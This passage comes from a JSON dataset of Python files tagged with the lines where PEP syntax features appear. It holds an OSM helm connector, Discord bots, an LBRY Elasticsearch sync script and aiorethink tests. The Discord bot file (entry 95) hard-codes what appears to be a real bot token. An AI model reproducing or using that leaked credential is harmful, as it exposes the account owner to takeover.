progress_timeout: float = None, total_timeout: float = None) -> str:\n        self.log.info(\"exec primitive for ee_id : {}, primitive_name: {}, params_dict: {}, db_dict: {}\".format(\n            ee_id, primitive_name, params_dict, db_dict\n        ))\n        if ee_id is None or len(ee_id) == 0:\n            raise N2VCBadArgumentsException(\n                message=\"ee_id is mandatory\", bad_args=[\"ee_id\"]\n            )\n        if primitive_name is None or len(primitive_name) == 0:\n            raise N2VCBadArgumentsException(\n                message=\"action_name is mandatory\", bad_args=[\"action_name\"]\n            )\n        if params_dict is None:\n            params_dict = dict()\n        try:\n            namespace, helm_id = self._get_ee_id_parts(ee_id)\n            ip_addr = socket.gethostbyname(helm_id)\n        except Exception as e:\n            self.log.error(\"Error getting ee ip ee: {}\".format(e))\n            raise N2VCException(\"Error getting ee ip ee: {}\".format(e))\n        if primitive_name == \"config\":\n            try:\n                status, detailed_message = await self._execute_config_primitive(ip_addr, params_dict, db_dict=db_dict)\n                self.log.debug(\"Executed config primitive ee_id_ {}, status: {}, message: {}\".format(\n                    ee_id, status, detailed_message))\n                if status != \"OK\":\n                    self.log.error(\"Error configuring helm ee, status: {}, message: {}\".format(\n                        status, detailed_message))\n                    raise N2VCExecutionException(\n                        message=\"Error configuring helm ee_id: {}, status: {}, message: {}: \".format(\n                            ee_id, status, detailed_message\n                        ),\n                        primitive_name=primitive_name,\n                    )\n            except Exception as e:\n                self.log.error(\"Error configuring helm ee: {}\".format(e))\n                raise N2VCExecutionException(\n                    message=\"Error configuring helm ee_id: {}, {}\".format(\n                        ee_id, e\n                    ),\n                    primitive_name=primitive_name,\n                )\n            return \"CONFIG OK\"\n        else:\n            try:\n                status, detailed_message = await self._execute_primitive(ip_addr, primitive_name,\n                                                                         params_dict, db_dict=db_dict)\n                self.log.debug(\"Executed primitive {} ee_id_ {}, status: {}, message: {}\".format(\n                    primitive_name, ee_id, status, detailed_message))\n                if status != \"OK\" and status != \"PROCESSING\":\n                    self.log.error(\n                        \"Execute primitive {} returned not ok status: {}, message: {}\".format(\n                            primitive_name, status, detailed_message)\n                    )\n                    raise N2VCExecutionException(\n                        message=\"Execute primitive {} returned not ok status: {}, message: {}\".format(\n                            primitive_name, status, detailed_message\n                        ),\n                        primitive_name=primitive_name,\n                    )\n            except Exception as e:\n                self.log.error(\n                    \"Error executing primitive {}: {}\".format(primitive_name, e)\n                )\n                raise N2VCExecutionException(\n                    message=\"Error executing primitive {} into ee={} : {}\".format(\n                        primitive_name, ee_id, e\n                    ),\n                    primitive_name=primitive_name,\n                )\n            return detailed_message\n    async def deregister_execution_environments(self):\n        pass\n    async def delete_execution_environment(self, ee_id: str, db_dict: dict = None, total_timeout: float = None):\n        self.log.info(\"ee_id: {}\".format(ee_id))\n        if ee_id is None:\n            raise N2VCBadArgumentsException(\n                message=\"ee_id is mandatory\", bad_args=[\"ee_id\"]\n            )\n        try:\n            system_cluster_uuid = self._get_system_cluster_id()\n            namespace, helm_id = self._get_ee_id_parts(ee_id)\n            await self._k8sclusterhelm.uninstall(system_cluster_uuid, helm_id)\n            self.log.info(\"ee_id: {} deleted\".format(ee_id))\n        except N2VCException:\n            raise\n        except Exception as e:\n            self.log.error(\"Error deleting ee id: {}: {}\".format(ee_id, e), exc_info=True)\n            raise N2VCException(\"Error deleting ee id {}: {}\".format(ee_id, e))\n    async def delete_namespace(self, namespace: str, db_dict: dict = None, total_timeout: float = None):\n        pass\n    async def install_k8s_proxy_charm(\n        self,\n        charm_name: str,\n        namespace: str,\n        artifact_path: str,\n        db_dict: dict,\n        progress_timeout: float = None,\n        total_timeout: float = None,\n        config: dict = None,\n    ) -> str:\n        pass\n    @retryer(max_wait_time=_MAX_INITIAL_RETRY_TIME, delay_time=_EE_RETRY_DELAY)\n    async def _get_ssh_key(self, ip_addr):\n        channel = Channel(ip_addr, self._ee_service_port)\n        try:\n            stub = FrontendExecutorStub(channel)\n            self.log.debug(\"get ssh key, ip_addr: {}\".format(ip_addr))\n            reply: SshKeyReply = await stub.GetSshKey(SshKeyRequest())\n            return reply.message\n        finally:\n            channel.close()\n    @retryer(max_wait_time=_MAX_INITIAL_RETRY_TIME, delay_time=_EE_RETRY_DELAY)\n    async def _execute_config_primitive(self, ip_addr, params, db_dict=None):\n        return await self._execute_primitive_internal(ip_addr, \"config\", params, db_dict=db_dict)\n    @retryer(max_wait_time=_MAX_RETRY_TIME, delay_time=_EE_RETRY_DELAY)\n    async def _execute_primitive(self, ip_addr, primitive_name, params, db_dict=None):\n        return await  self._execute_primitive_internal(ip_addr, primitive_name, params, db_dict=db_dict)\n    async def _execute_primitive_internal(self, ip_addr, primitive_name, params, db_dict=None):\n        channel = Channel(ip_addr, self._ee_service_port)\n        try:\n            stub = FrontendExecutorStub(channel)\n            async with stub.RunPrimitive.open() as stream:\n                primitive_id = str(uuid.uuid1())\n                result = None\n                self.log.debug(\"Execute primitive internal: id:{}, name:{}, params: {}\".\n                               format(primitive_id, primitive_name, params))\n                await stream.send_message(\n                    PrimitiveRequest(id=primitive_id, name=primitive_name, params=yaml.dump(params)), end=True)\n                async for reply in stream:\n                    self.log.debug(\"Received reply: {}\".format(reply))\n                    result = reply\n                    if db_dict:\n                        self._write_op_detailed_status(db_dict, reply.status, reply.detailed_message)\n                if result:\n                    return reply.status, reply.detailed_message\n                else:\n                    return \"ERROR\", \"No result received\"\n        finally:\n            channel.close()\n    def _write_op_detailed_status(self, db_dict, status, detailed_message):\n        try:\n            the_table = db_dict[\"collection\"]\n            the_filter = db_dict[\"filter\"]\n            update_dict = {\"detailed-status\": \"{}: {}\".format(status, detailed_message)}\n            self.db.set_one(\n                table=the_table,\n                q_filter=the_filter,\n                update_dict=update_dict,\n                fail_on_empty=True,\n            )\n        except asyncio.CancelledError:\n            raise\n        except Exception as e:\n            self.log.error(\"Error writing detailedStatus to database: {}\".format(e))\n    def _get_system_cluster_id(self):\n        if not self._system_cluster_id:\n            db_k8cluster = self.db.get_one(\"k8sclusters\", {\"name\": self._KUBECTL_OSM_CLUSTER_NAME})\n            k8s_hc_id = deep_get(db_k8cluster, (\"_admin\", \"helm-chart\", \"id\"))\n            if not k8s_hc_id:\n                self.log.error(\"osm system cluster has not been properly initialized for helm connector, \"\n                               \"helm-chart id is not defined\")\n                raise N2VCException(\"osm system cluster has not been properly initialized for helm connector\")\n            self._system_cluster_id = k8s_hc_id\n        return self._system_cluster_id\n    def _get_ee_id_parts(self, ee_id):\n        namespace, _, helm_id = ee_id.partition('.')\n        return namespace, helm_id",
            "patterns": {
                "pep_468": [
                    [
                        24,
                        "func(*args, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        270,
                        "reply: SshKeyReply = await stub.GetSshKey(SshKeyRequest())"
                    ]
                ],
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        291,
                        295,
                        "async for",
                        "async for reply in stream:\n                    self.log.debug(\"Received reply: {}\".format(reply))\n                    result = reply\n                    if db_dict:\n                        self._write_op_detailed_status(db_dict, reply.status, reply.detailed_message)"
                    ]
                ],
                "pep_498v": [
                    [
                        85,
                        87,
                        ".format()"
                    ],
                    [
                        98,
                        98,
                        ".format()"
                    ],
                    [
                        116,
                        116,
                        ".format()"
                    ],
                    [
                        146,
                        147,
                        ".format()"
                    ],
                    [
                        163,
                        165,
                        ".format()"
                    ],
                    [
                        236,
                        236,
                        ".format()"
                    ],
                    [
                        110,
                        110,
                        ".format()"
                    ],
                    [
                        245,
                        245,
                        ".format()"
                    ],
                    [
                        269,
                        269,
                        ".format()"
                    ],
                    [
                        306,
                        306,
                        ".format()"
                    ],
                    [
                        121,
                        121,
                        ".format()"
                    ],
                    [
                        122,
                        122,
                        ".format()"
                    ],
                    [
                        159,
                        159,
                        ".format()"
                    ],
                    [
                        160,
                        160,
                        ".format()"
                    ],
                    [
                        180,
                        180,
                        ".format()"
                    ],
                    [
                        181,
                        181,
                        ".format()"
                    ],
                    [
                        185,
                        186,
                        ".format()"
                    ],
                    [
                        209,
                        210,
                        ".format()"
                    ],
                    [
                        249,
                        249,
                        ".format()"
                    ],
                    [
                        250,
                        250,
                        ".format()"
                    ],
                    [
                        287,
                        288,
                        ".format()"
                    ],
                    [
                        316,
                        316,
                        ".format()"
                    ],
                    [
                        188,
                        189,
                        ".format()"
                    ],
                    [
                        197,
                        197,
                        ".format()"
                    ],
                    [
                        213,
                        214,
                        ".format()"
                    ],
                    [
                        224,
                        224,
                        ".format()"
                    ],
                    [
                        292,
                        292,
                        ".format()"
                    ],
                    [
                        191,
                        193,
                        ".format()"
                    ],
                    [
                        199,
                        201,
                        ".format()"
                    ],
                    [
                        217,
                        219,
                        ".format()"
                    ],
                    [
                        227,
                        229,
                        ".format()"
                    ]
                ]
            }
        },
        "95": {
            "file": "import discord\nimport asyncio\nimport subprocess\nimport string\nimport re\nimport traceback\nfrom discord.ext import commands\nclient = discord.Client()\nhunted_list = [\"Ailon\\xa0Diek\",\"Kimue\\xa0Stora\"]\nasync def readSubProcessFile():\n    try:\n        with open(\"output.txt\") as file_object:\n            contents = file_object.read()\n    except FileNotFoundError:\n            msg = 'couldnt find the file'\n            print(msg)\n            return \" \"\n    else:\n        deleteChars = \"\u00c2\\t\"\n        translator = str.maketrans('', '', deleteChars)\n        contents = contents.translate(translator);\n        words = contents.split(',');\n        return words\ndef split_to_vln(content):\n    t = []\n    for i in content:\n          t.append(list(filter(None, re.split(r'(\\d+)', i))))\n    return t\ndef swap_voc_short(vocation):\n    if( vocation == \"Paladin\"):\n       return \" P\"\n    if( vocation == \"Sorcerer\"):\n       return \" S\"\n    if( vocation == \"Druid\"):\n       return \" D\"\n    if( vocation == \"Knight\"):\n       return \" K\"\n    if( vocation == \"Royal\\xa0Paladin\"):\n       return \"RP\"\n    if( vocation == \"Elite\\xa0Knight\"):\n       return \"EK\"\n    if( vocation == \"Master\\xa0Sorcerer\"):\n       return \"MS\"\n    if( vocation == \"Elder\\xa0Druid\"):\n       return \"ED\"\n    return \" N\"\nasync def table(ctx):\n    p = subprocess.Popen([\"phantomjs.exe\",\"github.js\"])\n    p.wait()\n    content = await readSubProcessFile();\n    content = split_to_vln(content);\n    print(content)\n    await clearNotCommand(ctx,99)\n    temp = \"List of Hunted Online players\\n``````\"\n    startend = \"```\"\n    for i in content:\n            if(len(temp) > 1942):\n                await client.send_message(ctx,startend+temp+startend)\n                temp = \"\"\n            tName = i[0].strip()\n            tVoc = swap_voc_short(i[2].strip())\n            tLevel = str(i[1]).strip()\n            t= \"| \" + '{0: <3}'.format(tVoc) + \"| \" + '{0: <60}'.format(tName) + \"| \" +  '{0: <4}'.format(tLevel)+ \"|\\n\"\n            print(t)\n            temp+= t\n    if(len(temp) <= 1943):\n            await client.send_message(ctx,startend+temp+startend)\nasync def my_background_task():\n    await client.wait_until_ready()\n    counter = 0\n    channel = discord.Object(id='312008640137527296')\n    while not client.is_closed:\n        counter += 1\n        await table(channel)\n        await asyncio.sleep(5) \nasync def clearNotCommand(ctx, number = 99):\n    mgs = [] \n    number = int(number) \n    async for x in client.logs_from(ctx, limit = number):\n            mgs.append(x)\n    if len(mgs) == 0:\n        return\n    if len(mgs) == 1:\n        await client.delete_message(mgs[0])\n    else:\n        await client.delete_messages(mgs)\n@client.event\nasync def on_ready():\n    print('Logged in as')\n    print(client.user.name)\n    print(client.user.id)\n    print('------')\ntry:\n    client.loop.create_task(my_background_task())\n    client.run('MzA3MTI4MzIwMzQzMDE1NDQ0.C_UxCQ.jKf4B66x9bV-XvD4ALL6A7AMM0o')\nexcept Exception as e:\n     traceback.print_exc()\n     raise e",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        79,
                        80,
                        "async for",
                        "async for x in client.logs_from(ctx, limit = number):\n            mgs.append(x)"
                    ]
                ],
                "pep_498v": [
                    [
                        63,
                        63,
                        ".format()"
                    ],
                    [
                        63,
                        63,
                        ".format()"
                    ],
                    [
                        63,
                        63,
                        ".format()"
                    ]
                ]
            }
        },
        "96": {
            "file": "from .cogmixin import CogMixin\nfrom .common import errors\nfrom discord.ext import commands\nimport discord\nimport unicodedata\nimport asyncio\nimport logging\nlogger = logging.getLogger(__name__)\n_HOST_MESSAGE_SEC = 3600\n_DEFAULT_MESSAGE_SEC = 60\n_SHORT_MESSAGE_SEC = 10\nclass Hosting(CogMixin):\n    def __init__(self, bot):\n        self.bot = bot\n    @commands.command(pass_context=True)\n    async def host(self, ctx, ip_port: str, *comment):\n        normalized_host = unicodedata.normalize('NFKC', ip_port)\n        host_message = normalized_host + \" | \" + \" \".join(comment)\n        user = ctx.message.author\n        hostlist_ch = discord.utils.get(self.bot.get_all_channels(),\n                                           name=\"hostlist\")\n        not_private = not ctx.message.channel.is_private\n        if not_private:\n            await self.bot.delete_message(ctx.message)\n            raise errors.OnlyPrivateMessage\n        await self._delete_messages_from(hostlist_ch, user)\n        await self.bot.post(hostlist_ch, \"{0.mention}, {1}\".format(user, host_message), delete_after=_HOST_MESSAGE_SEC)\n        await self.bot.whisper(\"\u52df\u96c6\u3092\u958b\u59cb\u3057\u307e\u3057\u305f\u3002\")\n    @commands.command(pass_context=True)\n    async def client(self, ctx, *comment):\n        host_message = \"\u30af\u30e9\u5c02\u3002DM\u304b\u30e1\u30f3\u30b7\u30e7\u30f3\u3067IP\u3092\u304a\u9858\u3044\u3057\u307e\u3059\u3002\" + \" | \" + \" \".join(comment)\n        user = ctx.message.author\n        hostlist_ch = discord.utils.get(self.bot.get_all_channels(),\n                                           name=\"hostlist\")\n        not_private = not ctx.message.channel.is_private\n        if not_private:\n            await self.bot.delete_message(ctx.message)\n            raise errors.OnlyPrivateMessage\n        await self._delete_messages_from(hostlist_ch, user)\n        await self.bot.post(hostlist_ch, \"{0.mention}, {1}\".format(user, host_message), delete_after=_HOST_MESSAGE_SEC)\n        await self.bot.whisper(\"\u30af\u30e9\u5c02\u52df\u96c6\u3092\u958b\u59cb\u3057\u307e\u3057\u305f\u3002\")\n    @commands.command(pass_context=True)\n    async def close(self, ctx):\n        user = ctx.message.author\n        hostlist_ch = discord.utils.get(self.bot.get_all_channels(),\n                                           name=\"hostlist\")\n        not_private = not ctx.message.channel.is_private\n        if not_private:\n            await self.bot.delete_message(ctx.message)\n            raise errors.OnlyPrivateMessage\n        await self._delete_messages_from(hostlist_ch, user)\n        await self.bot.whisper(\"\u52df\u96c6\u3092\u7de0\u3081\u5207\u308a\u307e\u3057\u305f\u3002\")\n    async def _delete_messages_from(self, channel: discord.Channel, user: discord.User):\n        async for message in self.bot.logs_from(channel):\n            if message.mentions and message.mentions[0] == user:\n                await self.bot.delete_message(message)",
            "patterns": {
                "pep_567": [
                    [
                        6,
                        6,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        54,
                        56,
                        "async for",
                        "async for message in self.bot.logs_from(channel):\n            if message.mentions and message.mentions[0] == user:\n                await self.bot.delete_message(message)"
                    ]
                ],
                "pep_498v": [
                    [
                        27,
                        27,
                        ".format()"
                    ],
                    [
                        40,
                        40,
                        ".format()"
                    ]
                ]
            }
        },
        "97": {
            "file": "import os\nimport argparse\nimport asyncio\nimport logging\nfrom elasticsearch import AsyncElasticsearch\nfrom elasticsearch.helpers import async_streaming_bulk\nfrom lbry.wallet.server.env import Env\nfrom lbry.wallet.server.leveldb import LevelDB\nfrom lbry.wallet.server.db.elasticsearch.search import SearchIndex, IndexVersionMismatch\nfrom lbry.wallet.server.db.elasticsearch.constants import ALL_FIELDS\nasync def get_recent_claims(env, index_name='claims', db=None):\n    log = logging.getLogger()\n    need_open = db is None\n    db = db or LevelDB(env)\n    try:\n        if need_open:\n            db.open_db()\n        if db.es_sync_height == db.db_height or db.db_height <= 0:\n            return\n        if need_open:\n            await db.initialize_caches()\n        log.info(f\"catching up ES ({db.es_sync_height}) to leveldb height: {db.db_height}\")\n        cnt = 0\n        touched_claims = set()\n        deleted_claims = set()\n        for height in range(db.es_sync_height, db.db_height + 1):\n            touched_or_deleted = db.prefix_db.touched_or_deleted.get(height)\n            touched_claims.update(touched_or_deleted.touched_claims)\n            deleted_claims.update(touched_or_deleted.deleted_claims)\n            touched_claims.difference_update(deleted_claims)\n        for deleted in deleted_claims:\n            yield {\n                '_index': index_name,\n                '_op_type': 'delete',\n                '_id': deleted.hex()\n            }\n        for touched in touched_claims:\n            claim = db.claim_producer(touched)\n            if claim:\n                yield {\n                    'doc': {key: value for key, value in claim.items() if key in ALL_FIELDS},\n                    '_id': claim['claim_id'],\n                    '_index': index_name,\n                    '_op_type': 'update',\n                    'doc_as_upsert': True\n                }\n                cnt += 1\n            else:\n                logging.warning(\"could not sync claim %s\", touched.hex())\n            if cnt % 10000 == 0:\n                logging.info(\"%i claims sent to ES\", cnt)\n        db.es_sync_height = db.db_height\n        db.write_db_state()\n        db.prefix_db.unsafe_commit()\n        db.assert_db_state()\n        logging.info(\"finished sending %i claims to ES, deleted %i\", cnt, len(deleted_claims))\n    finally:\n        if need_open:\n            db.close()\nasync def get_all_claims(env, index_name='claims', db=None):\n    need_open = db is None\n    db = db or LevelDB(env)\n    if need_open:\n        db.open_db()\n        await db.initialize_caches()\n    logging.info(\"Fetching claims to send ES from leveldb\")\n    try:\n        cnt = 0\n        async for claim in db.all_claims_producer():\n            yield {\n                'doc': {key: value for key, value in claim.items() if key in ALL_FIELDS},\n                '_id': claim['claim_id'],\n                '_index': index_name,\n                '_op_type': 'update',\n                'doc_as_upsert': True\n            }\n            cnt += 1\n            if cnt % 10000 == 0:\n                logging.info(\"sent %i claims to ES\", cnt)\n    finally:\n        if need_open:\n            db.close()\nasync def make_es_index_and_run_sync(env: Env, clients=32, force=False, db=None, index_name='claims'):\n    index = SearchIndex(env.es_index_prefix, elastic_host=env.elastic_host, elastic_port=env.elastic_port)\n    logging.info(\"ES sync host: %s:%i\", env.elastic_host, env.elastic_port)\n    try:\n        created = await index.start()\n    except IndexVersionMismatch as err:\n        logging.info(\n            \"dropping ES search index (version %s) for upgrade to version %s\", err.got_version, err.expected_version\n        )\n        await index.delete_index()\n        await index.stop()\n        created = await index.start()\n    finally:\n        index.stop()\n    es = AsyncElasticsearch([{'host': env.elastic_host, 'port': env.elastic_port}])\n    if force or created:\n        claim_generator = get_all_claims(env, index_name=index_name, db=db)\n    else:\n        claim_generator = get_recent_claims(env, index_name=index_name, db=db)\n    try:\n        async for ok, item in async_streaming_bulk(es, claim_generator, request_timeout=600, raise_on_error=False):\n            if not ok:\n                logging.warning(\"indexing failed for an item: %s\", item)\n        await es.indices.refresh(index=index_name)\n    finally:\n        await es.close()\ndef run_elastic_sync():\n    logging.basicConfig(level=logging.INFO)\n    logging.getLogger('aiohttp').setLevel(logging.WARNING)\n    logging.getLogger('elasticsearch').setLevel(logging.WARNING)\n    logging.info('lbry.server starting')\n    parser = argparse.ArgumentParser(prog=\"lbry-hub-elastic-sync\")\n    parser.add_argument(\"-c\", \"--clients\", type=int, default=32)\n    parser.add_argument(\"-f\", \"--force\", default=False, action='store_true')\n    Env.contribute_to_arg_parser(parser)\n    args = parser.parse_args()\n    env = Env.from_arg_parser(args)\n    if not os.path.exists(os.path.join(args.db_dir, 'lbry-leveldb')):\n        logging.info(\"DB path doesnt exist, nothing to sync to ES\")\n        return\n    asyncio.run(make_es_index_and_run_sync(env, clients=args.clients, force=args.force))",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        11,
                        59,
                        "async generator",
                        "async def get_recent_claims(env, index_name='claims', db=None):\n    log = logging.getLogger()\n    need_open = db is None\n    db = db or LevelDB(env)\n    try:\n        if need_open:\n            db.open_db()\n        if db.es_sync_height == db.db_height or db.db_height <= 0:\n            return\n        if need_open:\n            await db.initialize_caches()\n        log.info(f\"catching up ES ({db.es_sync_height}) to leveldb height: {db.db_height}\")\n        cnt = 0\n        touched_claims = set()\n        deleted_claims = set()\n        for height in range(db.es_sync_height, db.db_height + 1):\n            touched_or_deleted = db.prefix_db.touched_or_deleted.get(height)\n            touched_claims.update(touched_or_deleted.touched_claims)\n            deleted_claims.update(touched_or_deleted.deleted_claims)\n            touched_claims.difference_update(deleted_claims)\n        for deleted in deleted_claims:\n            yield {\n                '_index': index_name,\n                '_op_type': 'delete',\n                '_id': deleted.hex()\n            }\n        for touched in touched_claims:\n            claim = db.claim_producer(touched)\n            if claim:\n                yield {\n                    'doc': {key: value for key, value in claim.items() if key in ALL_FIELDS},\n                    '_id': claim['claim_id'],\n                    '_index': index_name,\n                    '_op_type': 'update',\n                    'doc_as_upsert': True\n                }\n                cnt += 1\n            else:\n                logging.warning(\"could not sync claim %s\", touched.hex())\n            if cnt % 10000 == 0:\n                logging.info(\"%i claims sent to ES\", cnt)\n        db.es_sync_height = db.db_height\n        db.write_db_state()\n        db.prefix_db.unsafe_commit()\n        db.assert_db_state()\n        logging.info(\"finished sending %i claims to ES, deleted %i\", cnt, len(deleted_claims))\n    finally:\n        if need_open:\n            db.close()"
                    ],
                    [
                        60,
                        82,
                        "async generator",
                        "async def get_all_claims(env, index_name='claims', db=None):\n    need_open = db is None\n    db = db or LevelDB(env)\n    if need_open:\n        db.open_db()\n        await db.initialize_caches()\n    logging.info(\"Fetching claims to send ES from leveldb\")\n    try:\n        cnt = 0\n        async for claim in db.all_claims_producer():\n            yield {\n                'doc': {key: value for key, value in claim.items() if key in ALL_FIELDS},\n                '_id': claim['claim_id'],\n                '_index': index_name,\n                '_op_type': 'update',\n                'doc_as_upsert': True\n            }\n            cnt += 1\n            if cnt % 10000 == 0:\n                logging.info(\"sent %i claims to ES\", cnt)\n    finally:\n        if need_open:\n            db.close()"
                    ],
                    [
                        69,
                        79,
                        "async for",
                        "async for claim in db.all_claims_producer():\n            yield {\n                'doc': {key: value for key, value in claim.items() if key in ALL_FIELDS},\n                '_id': claim['claim_id'],\n                '_index': index_name,\n                '_op_type': 'update',\n                'doc_as_upsert': True\n            }\n            cnt += 1\n            if cnt % 10000 == 0:\n                logging.info(\"sent %i claims to ES\", cnt)"
                    ],
                    [
                        103,
                        105,
                        "async for",
                        "async for ok, item in async_streaming_bulk(es, claim_generator, request_timeout=600, raise_on_error=False):\n            if not ok:\n                logging.warning(\"indexing failed for an item: %s\", item)"
                    ]
                ],
                "pep_498": [
                    [
                        22,
                        "        log.info(f\"catching up ES ({db.es_sync_height}) to leveldb height: {db.db_height}\")"
                    ]
                ]
            }
        },
        "98": {
            "file": "import asyncio\nimport pytest\nimport rethinkdb as r\nimport aiorethink as ar\n@pytest.fixture\ndef EmptyFC():\n    class EmptyFC(ar.FieldContainer):\n        pass\n    return EmptyFC\ndef test_empty_fc_class(EmptyFC):\n    fc = EmptyFC()\n    assert len(fc) == 0\n    assert fc.len(ar.ALL) == 0\n    assert fc.len(ar.UNDECLARED_ONLY) == 0\n    assert fc.len(ar.DECLARED_ONLY) == 0\ndef test_repr(EmptyFC):\n    fc = EmptyFC()\n    r = repr(fc)\n    r = str(fc)\ndef test_just_undeclared_fields(EmptyFC):\n    fc1 = EmptyFC(f1 = \"f1val\", f2 = 2)\n    fc2 = EmptyFC(f2 = 2)\n    fc2[\"f1\"] = \"f1val\"\n    fc3 = EmptyFC()\n    fc3[\"f1\"] = \"f1val\"\n    fc3[\"f2\"] = 2\n    for fc in [fc1, fc2, fc3]:\n        assert len(fc) == 2\n        assert fc.len(ar.ALL) == 2\n        assert fc.len(ar.UNDECLARED_ONLY) == 2\n        assert fc.len(ar.DECLARED_ONLY) == 0\n        assert fc[\"f1\"] == \"f1val\"\n        assert fc[\"f2\"] == 2\n@pytest.fixture\ndef FCWithFields(aiorethink_session):\n    class FCWithFields(ar.FieldContainer):\n        f1 = ar.Field()\n        f2 = ar.Field()\n    return FCWithFields\ndef test_just_declared_fields(FCWithFields):\n    fc = FCWithFields()\n    assert len(fc) == 2\n    assert fc.f1 == None\n    fc.f1 = 1\n    assert fc.f1 == 1\n    fc[\"f1\"] = 2\n    assert fc.f1 == 2\n    assert len(fc) == 2\ndef test_mixed_fields(FCWithFields):\n    fc = FCWithFields()\n    fc[\"f3\"] = 3\n    assert len(fc) == 3\ndef test_invalid_field_name(aiorethink_session):\n    with pytest.raises(ar.IllegalSpecError):\n        class MyFC(ar.FieldContainer):\n            items = ar.Field()\n@pytest.fixture\ndef fc_mixed(FCWithFields):\n    return FCWithFields(f1 = 1, f2 = 2, f3 = 3, f4 = 4)\ndef test_contains(fc_mixed):\n    d = fc_mixed\n    assert \"f1\" in d\n    assert \"f4\" in d\n    assert \"f0\" not in d\ndef test_get(fc_mixed):\n    d = fc_mixed\n    assert d.get(\"f1\") == 1\n    assert d.get(\"f1\", 2) == 1\n    assert d.get(\"f4\", 2) == 4\n    assert d.get(\"blah\") == None\n    assert d.get(\"blah\", 2) == 2\ndef test_delitem(fc_mixed):\n    d = fc_mixed\n    assert d.f2 == 2\n    assert len(d) == 4\n    del d.f2\n    assert d.f2 == None\n    assert len(d) == 4\n    assert \"f2\" in d\n    d[\"f2\"] = 2\n    assert len(d) == 4\n    assert d.f2 == 2\n    del d[\"f2\"]\n    assert d.f2 == None\n    assert len(d) == 4\n    assert \"f2\" in d\n    assert d[\"f3\"] == 3\n    del d[\"f3\"]\n    with pytest.raises(KeyError):\n        v = d[\"f3\"]\n    assert len(d) == 3\n    assert \"f3\" not in d\ndef test_iter(fc_mixed):\n    keys = [ k for k in fc_mixed ]\n    keys.sort()\n    assert keys == [\"f1\", \"f2\", \"f3\", \"f4\"]\ndef test_keys(fc_mixed):\n    keys = list(fc_mixed.keys(ar.ALL))\n    keys.sort()\n    assert keys == [\"f1\", \"f2\", \"f3\", \"f4\"]\n    keys = list(fc_mixed.keys(ar.DECLARED_ONLY))\n    keys.sort()\n    assert keys == [\"f1\", \"f2\"]\n    keys = list(fc_mixed.keys(ar.UNDECLARED_ONLY))\n    keys.sort()\n    assert keys == [\"f3\", \"f4\"]\ndef test_values(fc_mixed):\n    values = list(fc_mixed.values(ar.ALL))\n    values.sort()\n    assert values == [1, 2, 3, 4]\n    values = list(fc_mixed.values(ar.DECLARED_ONLY))\n    values.sort()\n    assert values == [1, 2]\n    values = list(fc_mixed.values(ar.UNDECLARED_ONLY))\n    values.sort()\n    assert values == [3, 4]\ndef test_items(fc_mixed):\n    items = fc_mixed.items(ar.ALL)\n    assert len(items) == 4\n    for k, v in items:\n        assert fc_mixed[k] == v\ndef test_clear(fc_mixed):\n    for i in range(2):\n        fc_mixed.clear()\n        assert len(fc_mixed) == 2\n        assert fc_mixed.len(ar.UNDECLARED_ONLY) == 0\n        assert fc_mixed.f1 == None\n        with pytest.raises(KeyError):\n            v = fc_mixed[\"f3\"]\ndef test_copy(fc_mixed):\n    d = fc_mixed\n    c = d.copy()\n    assert c.f1 == d[\"f1\"]\n    assert c[\"f2\"] == d.f2\n    assert c[\"f3\"] == d[\"f3\"]\n    assert c[\"f4\"] == d[\"f4\"]\n    assert len(c) == len(d)\n    assert c.keys() == d.keys()\n    assert c.values() == d.values()\n    c = d.copy(ar.DECLARED_ONLY)\n    assert c.f1 == d[\"f1\"]\n    assert c[\"f2\"] == d.f2\n    with pytest.raises(KeyError):\n        v = c[\"f3\"]\n    assert len(c) < len(d)\n    c = d.copy(ar.UNDECLARED_ONLY)\n    assert c.f1 == c.f2 == None\n    assert c.f1 != d[\"f1\"]\n    assert c[\"f3\"] == d[\"f3\"]\n    assert len(c) == len(d)\ndef test_update(fc_mixed):\n    d = {\"f1\" : True,\n            \"f3\": True,\n            \"f5\": True}\n    fc_mixed.update(d, f6 = True)\n    assert len(fc_mixed) == 6\n    assert fc_mixed.f1 == True\n    assert fc_mixed.f2 == 2\n    assert fc_mixed[\"f3\"] == True\n    assert fc_mixed[\"f5\"] == True\n    assert fc_mixed[\"f6\"] == True\ndef test_update2(fc_mixed):\n    d = {\"f1\" : True,\n            \"f3\": True,\n            \"f5\": True}\n    fc_mixed.update(d.items())\n    assert len(fc_mixed) == 5\n    assert fc_mixed.f1 == True\n    assert fc_mixed.f2 == 2\n    assert fc_mixed[\"f3\"] == True\n    assert fc_mixed[\"f5\"] == True\n@pytest.fixture\ndef FCWithSpecialDBFieldNames(aiorethink_session):\n    class FCWithSpecialDBFieldNames(ar.FieldContainer):\n        f1 = ar.Field(name = \"field1\")\n    return FCWithSpecialDBFieldNames\n@pytest.fixture\ndef fc_special_dbname(FCWithSpecialDBFieldNames):\n    return FCWithSpecialDBFieldNames(f1 = 1, f2 = 2)\ndef test_get_key_for_dbkey(fc_special_dbname):\n    d = fc_special_dbname\n    assert d.get_key_for_dbkey(\"field1\") == \"f1\"\n    assert d.get_key_for_dbkey(\"f2\") == \"f2\"\ndef test_dbkeys(fc_special_dbname):\n    d = fc_special_dbname\n    dbkeys = d.dbkeys()\n    keys = d.keys()\n    assert dbkeys != keys\n    assert \"field1\" in dbkeys\n    assert \"field1\" not in keys\n    assert \"f1\" not in dbkeys\n    assert \"f1\" in keys\ndef test_setitem_fails_when_trying_to_make_undeclared_field_with_existing_dbname(fc_special_dbname):\n    with pytest.raises(ar.AlreadyExistsError):\n        fc_special_dbname[\"field1\"] = True\n@pytest.fixture\ndef FCWithSpecialDBReprField(FCWithSpecialDBFieldNames):\n    class SwapCaseValueType(ar.StringValueType):\n        def pyval_to_dbval(self, val):\n            return val.swapcase()\n        dbval_to_pyval = pyval_to_dbval \n    class FCWithSpecialDBReprField(FCWithSpecialDBFieldNames):\n        f_swapcase = ar.Field(SwapCaseValueType(), default = \"\")\n    return FCWithSpecialDBReprField\n@pytest.fixture\ndef fc_with_swapcase_field(FCWithSpecialDBReprField):\n    return 